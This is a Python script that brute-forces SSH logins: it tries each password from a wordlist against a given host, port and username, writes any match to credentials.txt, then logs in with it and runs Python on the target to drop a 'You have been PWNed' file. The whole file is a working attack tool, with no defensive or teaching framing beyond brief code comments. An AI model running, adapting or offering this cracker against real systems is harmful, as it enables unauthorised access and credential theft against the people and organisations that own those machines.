import argparse
import socket
import paramiko
from colorama import init, Fore

# RUN THIS SCRIPT FROM ROOT TERMINAL/SUDO PRIVILEGES

# Initiate colorama colors
init()
GREEN = Fore.GREEN
RED = Fore.RED

# Set final password as an empty string here
# to ensure it is global and can be used later
# on in the programs primary for loop
final_credentials = ''


###################################################################################################################
# Function: Attempts to open an SSH session with the given host, on the given port and with the given credentials #
# Params: Host to try and reach, port to use, and username/password credentials for the given target              #
# Return: True if the connection is established properly, False otherwise                                         #
###################################################################################################################
def ssh_session(host, port, username, pass_word):
    try:
        client.connect(host, port, username, pass_word)
    except socket.timeout:
        print(f"{RED}[!] Host {host} is unreachable, timed out")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[!] Invalid credentials for {username}:{pass_word}")
        return False
    else:
        print(f"{GREEN}[+] Found Combo:\n\tHOSTNAME: {host}\n\tUSERNAME: {username}\n\tPASSWORD: {pass_word}")
        return True


# Initiate SSH Client Object
client = paramiko.SSHClient()
client.load_system_host_keys()

# Policy for automatically adding the hostname and new
# host key to the local host keys file and saving it
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Initiate parser object and add custom arguments
parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="IP address of target")
parser.add_argument("-p", "--port", type=int, required=True, help="Port to try and open SSH connection on")
parser.add_argument("-u", "--user", type=str, required=True, help="Username of target ")
parser.add_argument("-f", "--password_file", type=str, help="File of passwords to try cracking with")
args = parser.parse_args()
this_host = args.host
this_port = args.port
this_user = args.user
this_file = args.password_file

# Open password file to crack with, then start looping
# through password file and attempting connections
file = open(this_file, "r").read().splitlines()
for password in file:
    if ssh_session(this_host, this_port, this_user, password):
        print("\n[+] Credentials Found! Password is " + password + ", saving to file in directory program was ran from")
        print()
        open("credentials.txt", "w").write("Password: " + password)
        final_credentials = password
        break

# Connect to client with cracked credentials
# and run a command (execute Python interpreter)
client.connect(this_host, this_port, this_user, final_credentials)
stdin, stdout, stderr = client.exec_command('python')

# Send data via STDIN, and shutdown when done
stdin.write('open("tester.txt", "w").write("Congratulations! You have been PWNed :) ")')
stdin.channel.shutdown_write()

# Print output of command. Will wait for command to finish.
if stdout:
    print(f'\nSTDOUT: {stdout.read().decode("utf8")}')
else:
    print(f'\nSTDERR: {stderr.read().decode("utf8")}')

# Get return code from command (0 is default for success)
print(f'Return code: {stdout.channel.recv_exit_status()}')

# Because they are file objects,
# they need to be closed
stdin.close()
stdout.close()
stderr.close()

# Close the client itself
client.close()
